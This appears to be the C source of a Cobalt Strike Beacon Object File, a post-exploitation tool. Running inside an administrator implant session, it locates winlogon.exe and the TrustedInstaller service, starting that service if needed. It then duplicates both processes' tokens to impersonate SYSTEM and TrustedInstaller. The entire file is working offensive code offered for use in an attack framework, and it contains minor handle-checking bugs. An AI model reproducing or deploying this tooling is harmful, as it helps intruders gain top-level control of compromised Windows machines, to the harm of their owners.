#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "beacon.h"

WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
WINBASEAPI WINBOOL WINAPI KERNEL32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
WINBASEAPI WINBOOL WINAPI KERNEL32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
WINBASEAPI HANDLE  WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINBASEAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
WINBASEAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
WINBASEAPI WINBOOL WINAPI ADVAPI32$QueryServiceStatusEx(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
WINBASEAPI WINBOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
WINBASEAPI DWORD WINAPI KERNEL32$SleepEx(DWORD dwMilliseconds, WINBOOL bAlertable);

int my_strcmp(const char *s1, const char *s2)
{
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}

DWORD GetProcByPID(CHAR *name)
{
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD PID = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(KERNEL32$Process32First(hSnap, &pe32)) {
        do {
            if(my_strcmp(pe32.szExeFile, name) == 0) {
                PID = pe32.th32ProcessID;
                break;
            }
        } while(KERNEL32$Process32Next(hSnap, &pe32));
    }

    KERNEL32$CloseHandle(hSnap);
    return PID;
}

DWORD GetTrustedInstallerPID()
{
    DWORD PID = 0;
    SC_HANDLE schManager = ADVAPI32$OpenSCManagerA(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if(schManager == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "OpenSCManager failed. Error: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    SC_HANDLE schService = ADVAPI32$OpenServiceA(schManager, "TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);
     if(schManager == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "OpenService failed. Error: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(schManager);
        return FALSE;
    }
    KERNEL32$CloseHandle(schManager);

    SERVICE_STATUS_PROCESS ssp;
    DWORD dwSize = 0;

    while(ADVAPI32$QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {
        if(ssp.dwCurrentState == SERVICE_STOPPED) {
            if(!ADVAPI32$StartServiceA(schService, 0, NULL)) {
                BeaconPrintf(CALLBACK_OUTPUT, "StartService failed. Error: %d\n", KERNEL32$GetLastError());
                KERNEL32$CloseHandle(schService);
                return FALSE;
            }
        }
        if(ssp.dwCurrentState == SERVICE_RUNNING) {
            PID = ssp.dwProcessId;
            break;
        }
        KERNEL32$SleepEx(5000, FALSE);
    }

    KERNEL32$CloseHandle(schService);
    return PID;
}

BOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage)
{
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);
    if(hProc == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "OpenProcess on PID %d failed. Error: %d\n", PID, KERNEL32$GetLastError());
        return FALSE;
    }

    HANDLE hToken = NULL;
    if(!ADVAPI32$OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "OpenProcessToken on PID %d failed. Error: %d\n", PID, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }
    KERNEL32$CloseHandle(hProc);

    HANDLE hDup = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = FALSE;

    if(!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenImpersonation, &hDup)) {
        BeaconPrintf(CALLBACK_OUTPUT, "DuplicateTokenEx on PID %d failed. Error: %d\n", PID, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }
    KERNEL32$CloseHandle(hToken);

    if(!BeaconUseToken(hDup)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Impersonation on PID %d failed. Error: %d\n", PID, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hDup);
        return FALSE;
    }
    *hStorage = hDup;

    return TRUE;
}

BOOL ElevateSystem(HANDLE *hTokenSystem)
{
    DWORD PID = GetProcByPID("winlogon.exe");
    if(PID != 0){
        if(ImpersonateByPID(PID, hTokenSystem))
            return TRUE;
    }
    return FALSE;
}

BOOL ElevateTrustedInstaller(HANDLE *hTokenTrustedInstaller)
{
    DWORD PID = GetTrustedInstallerPID();
    if(PID != 0) {
        if(ImpersonateByPID(PID, hTokenTrustedInstaller)) {
            return TRUE;
        }
    }
    return FALSE;
}

void go(char *args, int len)
{
    formatp output;

    if(!BeaconIsAdmin()) {
        BeaconOutput(CALLBACK_ERROR, "The session must have administrator rights\n", 44);
        return;
    }

    HANDLE hTokenSystem = NULL;
    if(!ElevateSystem(&hTokenSystem))
      return;

    HANDLE hTokenTrustedInstaller = NULL;
    if(!ElevateTrustedInstaller(&hTokenTrustedInstaller))
      return;

    BeaconOutput(CALLBACK_OUTPUT, "Impersonate to SYSTEM & TrustedInstaller succeeded", 51);
}